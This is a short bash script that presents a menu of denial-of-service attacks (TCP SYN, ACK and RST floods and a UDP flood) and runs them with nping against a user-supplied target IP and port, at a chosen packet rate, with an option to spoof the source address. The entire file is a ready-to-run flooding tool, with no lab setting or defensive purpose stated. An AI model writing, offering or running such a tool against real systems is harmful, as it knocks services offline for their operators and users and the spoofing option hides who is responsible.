#!/bin/bash

echo "Select the type of DoS attack you want to run:"
echo "1) TCP SYN Flood"
echo "2) TCP ACK Flood"
echo "3) TCP RST Flood"
echo "4) UDP Flood"

read -p "Enter the number of the attack: " ATTACK_TYPE

# Common parameters
read -p "Enter the target IP address: " TARGET
read -p "Enter the destination port: " PORT
read -p "Enter the rate of packets per second: " RATE
read -p "Enter the total number of packets to send: " TOTAL

# Source IP
read -p "Enter the source IP address (or 'i' for your own IP): " SOURCE

if [ "$SOURCE" = "i" ]; then
    SOURCE=""
else
    SOURCE="-S $SOURCE"
fi

# Determine which attack to execute
case $ATTACK_TYPE in
    1)
        # TCP SYN Flood
        echo "Running TCP SYN Flood..."
        sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $SOURCE $TARGET
        ;;
    2)
        # TCP ACK Flood
        echo "Running TCP ACK Flood..."
        sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 $SOURCE $TARGET
        ;;
    3)
        # TCP RST Flood
        echo "Running TCP RST Flood..."
        sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 $SOURCE $TARGET
        ;;
    4)
        # UDP Flood
        read -p "Enter the data string to send: " DATA
        echo "Running UDP Flood..."
        sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $SOURCE $TARGET
        ;;
    *)
        echo "Invalid option selected!"
        ;;
esac
